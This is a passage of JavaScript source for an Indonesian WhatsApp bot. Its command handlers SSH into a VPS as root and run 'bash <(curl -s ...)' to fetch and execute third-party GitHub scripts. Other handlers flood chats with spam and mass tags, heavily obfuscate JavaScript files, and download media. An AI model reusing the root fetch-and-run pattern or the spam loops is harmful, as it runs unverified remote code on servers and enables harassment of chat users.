}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "",
rows: [
{ title: "*✨ Install Tema Stellar Membuat panel Pterodactyl Anda lebih modern dan menarik dengan tema Stellar*", id: ".response_installtema1" }, 
{ title: "*✨ Install Tema Billing Membuat panel Pterodactyl Anda lebih modern dan menarik dengan tema Billing*", id: ".response_installtema2" }, 
{ title: "*✨ Install Tema Enigma Membuat panel Pterodactyl Anda lebih modern dan menarik dengan tema Enigma*", id: ".response_installtema3" },
{ title: "*✨ Install Tema Elysium Membuat panel Pterodactyl Anda lebih modern dan menarik dengan tema Elysium*", id: ".response_installtema4" },
{ title: "*✨ Install Depend Untuk Melakukan Install Tema Nebula Sebelum Menginstall Tema Nebula Install Depend*", id: ".response_installtema5" },
{ title: "*✨ Install Tema Nebula Membuat panel Pterodactyl Anda lebih modern dan menarik dengan tema Nebula*", id: ".response_installtema6" },
{ title: "*✨ Install Tema Nightcore Membuat panel Pterodactyl Anda lebih modern dan menarik dengan tema Nightcore*", id: ".response_installtema7" }
]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

//================================================================================

case "response_installtema1": {
if (!isCreator) return m.reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "response_installtema2": {
if (!isCreator) return m.reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "response_installtema3": {
if (!isCreator) return m.reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); // Key Token : skyzodev
stream.write('1\n');
stream.write('3\n');
stream.write('\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/FYzsZkNZnGu7a4Y32aGx6j\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "response_installtema4": {
    if (!isCreator) return m.reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
        
    const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`
    const ress = new Client();

    await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write(`1\n`)
                stream.write(`2\n`)
                stream.write(`yes\n`)
                stream.write(`x\n`)
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break

//================================================================================

case "response_installtema5": {
    if (!isCreator) return m.reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
        
    const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
    const ress = new Client();

    await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write(`1\n`)
                stream.write(`2\n`)
                stream.write(`yes\n`)
                stream.write(`x\n`)
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break

//================================================================================

case "response_installtema6": {
    if (!isCreator) return m.reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
        
    const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
    const ress = new Client();

    await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write(`1\n`)
                stream.write(`2\n`)
                stream.write(`yes\n`)
                stream.write(`x\n`)
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break

//================================================================================
case "response_installtema7": {
    if (!isCreator) return m.reply(mess.owner)
    if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

    let ipvps = global.installtema.vps
    let passwd = global.installtema.pwvps
    let pilihan = text

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    }
        
    const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodactyl_Nightcore_Theme/main/install.sh)`
    const ress = new Client();

    await m.reply("Memproses Instalasi Tema Panel\nSilahkan Tunggu 1-10 Menit")

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err
            stream.on('close', async (code, signal) => {    
                await m.reply('Berhasil Menginstall Tema Pterodactyl ✅')
                ress.end()
            }).on('data', async (data) => {
                console.log(data.toString())
                stream.write(`1\n`)
                stream.write(`2\n`)
                stream.write(`yes\n`)
                stream.write(`x\n`)
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data)
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        m.reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
}
break

case "uninstalladdon": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* addon pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`9\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "backup": case "ambilsc": case "backupsc": {
if (m.sender.split("@")[0] !== global.owner && m.sender !== botNumber) return Reply(mess.owner)
let dir = await fs.readdirSync("./library/database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./library/database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `Simple-Botz-V4 New`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await conn.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetdb": case "rstdb": {
if (!isCreator) return Reply(mess.owner)
for (let i of Object.keys(global.db)) {
global.db[i] = {}
}
m.reply("Berhasil mereset database ✅")
}
break

case "sendsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./source/listscript")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
if (!text) return m.reply(example("namasc|6285###"))
if (!text.split("|'")) return m.reply(example("namasc|6285###"))
const input = m.mentionedJid[0] ? m.mentionedJid[0] : text.split("|")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
let namasc = text.split("|")[0]
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return m.reply('Nama script tidak ditemukan')
await conn.sendMessage(input, {document: fs.readFileSync("./source/listscript/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: m})
m.reply(`Berhasil mengirim script *${namasc}* ke ${input.split("@")[0]}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "getsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./source/listscript")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
if (!text) return m.reply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return m.reply('Nama script tidak ditemukan')
await conn.sendMessage(m.chat, {document: fs.readFileSync("./source/listscript/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./source/listscript")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
if (!text) return m.reply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return m.reply('Nama script tidak ditemukan')
await fs.unlinkSync("./source/listscript/"+namasc)
m.reply(`Berhasil menghapus script *${namasc}*`)
}
break

case "playvid": {
if (!text) return m.reply(example("dj tiktok"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytmp4(res.url)
if (anu.video) {
let urlMp3 = anu.video
await conn.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
}
break

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
var anu = await ytmp4(text)
if (anu.video) {
let urlMp3 = anu.video
await conn.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tiktokmp3": case "ttmp3": case "ttaudio": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "spotify": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://restapi.simplebot.my.id/api/download/spotify?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {audio: {url: res.result}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

case "spam": {
    if (!isCreator) return m.reply(mess.owner);

    if (!text) return m.reply(example("pesannya|jumlah spam"));

    // Split input untuk mendapatkan pesan dan jumlah spam
    const args = text.split("|");
    const spamMessage = args[0].trim(); // Pesan yang akan dikirim
    const spamCount = args[1] ? parseInt(args[1].trim()) : 1; // Default ke 1 jika tidak ada jumlah yang diberikan

    if (isNaN(spamCount) || spamCount < 1) {
        return m.reply("Jumlah spam tidak valid. Harap masukkan angka yang valid.");
    }

    // Kirim pesan spam sebanyak yang ditentukan
    for (let i = 0; i < spamCount; i++) {
        await conn.sendMessage(m.chat, { text: spamMessage }, { quoted: m });
    }

    await m.reply(`Berhasil mengirim spam sebanyak ${spamCount} kali!`);
}
break;

case "spam2": {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isCreator && !m.isAdmin) return m.reply(mess.admin);

    if (!text) return m.reply(example("pesannya|jumlah spam"));

    // Split input untuk mendapatkan pesan dan jumlah spam
    const args = text.split("|");
    const spamMessage = args[0].trim(); // Pesan yang akan dikirim
    const spamCount = args[1] ? parseInt(args[1].trim()) : 1; // Default ke 1 jika tidak ada jumlah yang diberikan

    if (isNaN(spamCount) || spamCount < 1) {
        return m.reply("Jumlah spam tidak valid. Harap masukkan angka yang valid.");
    }

    // Kirim pesan spam sebanyak yang ditentukan
    for (let i = 0; i < spamCount; i++) {
        await conn.sendMessage(m.chat, { text: spamMessage }, { quoted: m });
    }

    await m.reply(`Berhasil mengirim spam sebanyak ${spamCount} kali!`);
}
break;

case "spamtag": case "tag": {
 if (!m.isGroup) return m.reply(mess.group);
 if (!isCreator && !m.isAdmin) return m.reply(mess.admin);

if (!text) return m.reply(example("pesannya|jumlah spam"));

// Split the input to get the tag/user and the number of spams
const args = text.split("|");
const tag = args[0]; // @tag or user number
const spamCount = args[1] ? parseInt(args[1].trim()) : 1; // Default to 1 if no count is given

if (isNaN(spamCount) || spamCount < 1) {
    return m.reply("Jumlah spam tidak valid. Harap masukkan angka yang valid.");
}

// If the mentioned user is not valid, handle error
let input = m.mentionedJid[0] ? m.mentionedJid[0] : tag ? tag.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false;

if (!input) return m.reply("Tag atau nomor yang valid harus diberikan.");

let member = m.metadata.participants.map(v => v.id); // list of group members

// Spam tag the user as many times as specified
for (let i = 0; i < spamCount; i++) {
    await conn.sendMessage(m.chat, { text: text, mentions: [input, ...member] }, { quoted: m });
}

await m.reply(`Berhasil spam tag ${spamCount} kali!`);

} 
break;

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await fetchJson(`https://restapi-v2.simplebot.my.id/search/happymod?q=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.url}\n`
}
m.reply(teks)
conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error"))
}
break

case "playspotify": case "plays": case "playsp": {
if (!text) return m.reply(example("intro ariana"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})

var anu = await fetchJson("https://restapi.simplebot.my.id/api/download/playspotify?q="+text)

if (anu.result.download.link) {
let urlMp3 = anu.result.download.link
await conn.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: anu.result.metadata.cover_url, title: anu.result.metadata.title, body: `Author ${anu.result.metadata.artists} || Duration ${anu.result.metadata.duration}`, sourceUrl: anu.result.metadata.link, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

case "deepseek": case "depsek": case "deepsek": {
let talk = text ? text : "Hallo Kamu Siapa ?"
await fetchJson("https://restapi-v2.simplebot.my.id/ai/deepseek?text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

case "capcut": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/capcut?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {video: {url: res.result.videoUrl}, mimetype: "video/mp4", caption: "*Capcut Downloader ✅*"}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

case "emojigif": {
if (!text) return m.reply(example('😍'))
try {
let brat = `https://restapi-v2.simplebot.my.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await conn.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

case "emojimix": {
if (!text) return m.reply(example('😀|😍'))
if (!text.split("|")) return m.reply(example('😀|😍'))
let [e1, e2] = text.split("|")
let brat = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
let videoBuffer = await getBuffer(brat)
try {
await conn.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await conn.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: qtext})
}
}).catch(e => console.log(e))
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

case "brat": {
if (!text) return m.reply(example('teksnya'))
let brat = `https://restapi-v2.simplebot.my.id/imagecreator/brat?text=${text}`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await conn.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {

}
}
break

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

case "bratvid":  case "brat2": {
if (!text) return Reply(example('teksnya'))
try {
let brat = `https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await conn.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

case "enc": case "encrypt": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("dengan reply file .js"))
if (mime !== "application/javascript" && mime !== "text/javascript") return m.reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./database/sampah/${filename}`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./database/sampah/${filename}`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./database/sampah/${filename}`, obfuscated)
  await conn.sendMessage(m.chat, {document: fs.readFileSync(`./database/sampah/${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt file sukses ✅"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
  await fs.unlinkSync(`./database/sampah/${filename}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "enchard": case "encrypthard": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply("Reply file .js")
if (mime !== "application/javascript" && mime !== "text/javascript") return m.reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*ZarStore/*^/*($break)*/" + 
            "/*ZarStore/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await conn.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}.js`)
}
break

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: conn.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await conn.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await conn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
